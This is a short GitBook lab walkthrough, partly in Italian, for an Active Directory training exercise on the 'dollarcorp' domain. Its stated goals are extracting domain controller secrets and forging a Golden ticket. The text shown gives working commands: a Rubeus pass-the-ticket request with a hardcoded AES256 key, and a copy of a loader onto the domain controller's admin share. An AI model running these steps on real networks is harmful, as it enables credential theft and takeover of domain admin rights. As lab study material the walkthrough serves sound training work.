# LEARNING OBJECTIVE8

<figure><img src="../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

1. Extract secrets from the domain controller of dollarcorp.
2. Using the secrets of krbtgt account, create a Golden ticket.
3. &#x20;Use the Golden ticket to (once again) get domain admin privileges from\
   a machine.

### Svolgimento

Esegui il comando riportato di seguito da un prompt dei comandi con privilegi elevati (Esegui come amministratore) per avviare un processo con privilegi di amministratore di dominio:

```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

Esegui il seguente comando usando il nuovo prompt spawnato con Rubeus come DA per copiare il Loader sul dc

```powershell
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y
```

<figure><img src="../.gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>
